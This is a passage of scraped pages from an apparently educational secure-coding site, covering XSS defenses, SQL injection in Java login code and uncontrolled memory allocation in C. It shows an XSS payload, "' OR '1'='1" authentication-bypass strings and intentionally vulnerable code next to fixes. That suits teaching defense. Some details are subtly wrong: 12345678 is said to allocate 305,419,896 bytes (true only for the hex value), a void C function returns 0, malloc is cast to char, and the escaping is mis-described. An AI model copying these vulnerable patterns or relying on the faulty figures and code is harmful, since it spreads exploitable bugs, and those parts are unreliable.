<p>Contextual output encoding/escaping could be used as the primary defense mechanism to stop XSS attacks. There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and URL (or percent) encoding. Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.
Although widely recommended, performing HTML entity encoding only on the five XML significant characters is not always sufficient to prevent many forms of XSS attacks. As encoding is often difficult, security encoding libraries are usually easier to use.</p>
<h3 id="safely-validating-untrusted-html-input2">Safely validating untrusted HTML input<sup id="fnref2-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>Many operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <code>&lt;b&gt;very&lt;/b&gt; large</code>), output encoding (such as <code>&amp;lt;b&amp;gt;very&amp;lt;/b&amp;gt; large</code>) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as <code>very large</code>, instead of <code>&lt;b&gt;very&lt;/b&gt; large</code>). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.
It should also be noted that many validations rely on parsing out (blacklisting) specific "at risk" html tags such as the following</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="err"> &lt;link&gt; &lt;iframe&gt;</span>
</pre></div>
</td></tr></table>
<p>There are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS. See below</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"javascript:alert(1)"</span><span class="p">&gt;</span>
</pre></div>
</td></tr></table>
<p>Another popular method is to strip user input of " and ' however this can also be bypassed as the payload can be concealed with Obfuscation.</p>
<h3 id="separate-data-and-code1">Separate data and code<sup id="fnref3-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup></h3>
<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
<h3 id="set-the-session-cookie-to-be-httponly16">Set the session cookie to be HttpOnly<sup id="fnref4-cwe"><a class="footnote-ref" href="#fn-cwe">1</a></sup><sup id="fnref-http-only"><a class="footnote-ref" href="#fn-http-only">6</a></sup></h3>
<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use <code>document.cookie</code>. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, <code>XMLHTTPRequest</code> and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</p>
<h3 id="disable-scripts2">Disable scripts<sup id="fnref3-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>While Web 2.0 and Ajax developers require the use of JavaScript, some web applications are written to allow operation without the need for any client-side scripts. This allows users, if they choose, to disable scripting in their browsers before using the application. In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.</p>
<h3 id="cookie-protection2">Cookie protection<sup id="fnref4-wikipedia"><a class="footnote-ref" href="#fn-wikipedia">2</a></sup></h3>
<p>Besides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling cookie-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies. To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie. This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same NATed IP address or web proxy as the victim, or the victim is changing his or her mobile IP.</p>
<h3 id="use-static-code-analyzer">Use static code analyzer</h3>
<p>Such as Pinpoint from <a href="https://www.sourcebrella.com/">Sourcebrella Inc</a></p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/79.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref2-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref3-cwe" title="Jump back to footnote 1 in the text">↩</a><a class="footnote-backref" href="#fnref4-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/Cross-site_scripting <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref2-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref3-wikipedia" title="Jump back to footnote 2 in the text">↩</a><a class="footnote-backref" href="#fnref4-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
<li id="fn-htbridge">
<p>https://www.htbridge.com/vulnerability/cross-site-scripting.html <a class="footnote-backref" href="#fnref-htbridge" title="Jump back to footnote 3 in the text">↩</a></p>
</li>
<li id="fn-white-hat-web">
<p>https://www.amazon.cn/dp/B00LADBDG6/ref=sr_1_1?ie=UTF8&amp;qid=1525694060&amp;sr=8-1&amp;keywords=%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8 <a class="footnote-backref" href="#fnref-white-hat-web" title="Jump back to footnote 4 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 5 in the text">↩</a></p>
</li>
<li id="fn-http-only">
<p>https://www.owasp.org/index.php/HttpOnly#What_is_HttpOnly.3F <a class="footnote-backref" href="#fnref-http-only" title="Jump back to footnote 6 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-79.html">CWE-79</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0081">SQL Injection Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>SQL injection vulnerabilities arise in applications where elements of a SQL query originate from an untrusted source. Without precautions, the untrusted data may maliciously alter the query, resulting in information leaks or data modification. </p>
<p>Suppose a system authenticates users by issuing the following query to a SQL database. If the query returns any results, authentication succeeds; otherwise, authentication fails.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span>  <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>Suppose an attacker can substitute arbitrary strings for <username> and <password>. In that case, the authentication mechanism can be bypassed by supplying the following <username> with an arbitrary password:</username></password></username></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">validuser</span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>The authentication routine dynamically constructs the following query:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'validuser'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>If validuser is a valid user name, this SELECT statement yields the validuser record in the table. The password is never checked because <code>username='validuser'</code> is true; consequently, the items after the OR are not tested. As long as the components after the OR generate a syntactically correct SQL expression, the attacker is granted the access of validuser.</p>
<p>Similarly, an attacker could supply the following string for <password> with an arbitrary username:</password></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>producing the following query:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span>
</pre></div>
</td></tr></table>
<p><code>'1'='1'</code> always evaluates to true, causing the query to yield every row in the database. In this scenario, the attacker would be authenticated without needing a valid username or password.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>SQL injection is a code injection technique, used to attack data-driven applications, in which nefarious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker). SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.</p>
<p>SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>The primary means of preventing SQL injection are sanitization and validation, which are typically implemented as parameterized queries and stored procedures.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>The JDBC library provides an API for building SQL commands that sanitize untrusted data. The java.sql.PreparedStatement class properly escapes input strings, preventing SQL injection when used correctly. This code example modifies the doPrivilegedAction() method to use a PreparedStatement instead of java.sql.Statement. However, the prepared statement still permits a SQL injection attack by incorporating the unsanitized input argument username into the prepared statement.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.ResultSet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.Statement</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">Login</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">Connection</span> <span class="nf">getConnection</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">DriverManager</span><span class="o">.</span><span class="na">registerDriver</span><span class="o">(</span><span class="k">new</span>
            <span class="n">com</span><span class="o">.</span><span class="na">microsoft</span><span class="o">.</span><span class="na">sqlserver</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">SQLServerDriver</span><span class="o">());</span>
    <span class="n">String</span> <span class="n">dbConnection</span> <span class="o">=</span>
      <span class="n">PropertyManager</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"db.connection"</span><span class="o">);</span>
    <span class="c1">// Can hold some value like</span>
    <span class="c1">// "jdbc:microsoft:sqlserver://&lt;HOST&gt;:1433,&lt;UID&gt;,&lt;PWD&gt;"</span>
    <span class="k">return</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">dbConnection</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="n">String</span> <span class="nf">hashPassword</span><span class="o">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Create hash of password</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
    <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
  <span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span> <span class="s">"select * from db_user where username="</span> <span class="o">+</span>
        <span class="n">username</span> <span class="o">+</span> <span class="s">" and password ="</span> <span class="o">+</span> <span class="n">pwd</span><span class="o">;</span>     
      <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>

      <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
      <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
      <span class="o">}</span>

      <span class="c1">// Authenticated; proceed</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">try</span> <span class="o">{</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Forward to handler</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a parametric query with a ? character as a placeholder for the argument. This code also validates the length of the username argument, preventing an attacker from submitting an arbitrarily long user name.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
  <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
<span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
  <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Handle error</span>
  <span class="o">}</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>

    <span class="c1">// Validate username length</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>

    <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span>
      <span class="s">"select * from db_user where username=? and password=?"</span><span class="o">;</span>
    <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">username</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
    <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="c1">// Authenticated; proceed</span>
  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Use the <code>set*()</code> methods of the PreparedStatement class to enforce strong type checking. This technique mitigates the SQL injection vulnerability because the input is properly escaped by automatic entrapment within double quotes. Note that prepared statements must be used even with queries that insert data into the database.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/89.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-89.html">CWE-89</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0088">Uncontrolled Memory Allocation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code Example 3</a></li>
<li><a href="#fixed-code-example-3">Fixed code Example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The product allocates memory based on an untrusted size value, but it does not validate or incorrectly validates the size, allowing arbitrary amounts of memory to be allocated. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Not controlling memory allocation can result in a request for too much system memory, possibly leading to a crash of the application due to out-of-memory conditions, or the consumption of a large amount of memory on the system. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.</p>
<p>Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>Consider the following code, which accepts an untrusted size value and allocates a buffer to contain a string of the given size.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>Suppose an attacker provides a size value of:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>12345678
</pre></div>
</td></tr></table>
<p>This will cause 305,419,896 bytes (over 291 megabytes) to be allocated for the string.</p>
<h3 id="fixed-code-example-1">Fixed code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>

<span class="c1">// Ensure the size is acceptable...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">totBytes</span> <span class="o">&gt;</span> <span class="mi">100000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>Consider the following code, which accepts an untrusted size value and uses the size as an initial capacity for a HashMap.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>The HashMap constructor will verify that the initial capacity is not negative, however there is no check in place to verify that sufficient memory is present. If the attacker provides a large enough value, the application will run into an OutOfMemoryError.</p>
<h3 id="fixed-code-example-2">Fixed code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>

<span class="c1">// Ensure the size is acceptable...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">10000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-3">Vulnerable code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span> 
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-3">Fixed code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">const</span> <span class="kt">int</span> <span class="n">MAX_LENGTH</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>  
<span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&gt;</span><span class="n">MAX_LENGTH</span> <span class="o">||</span> <span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">buffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="p">...</span>
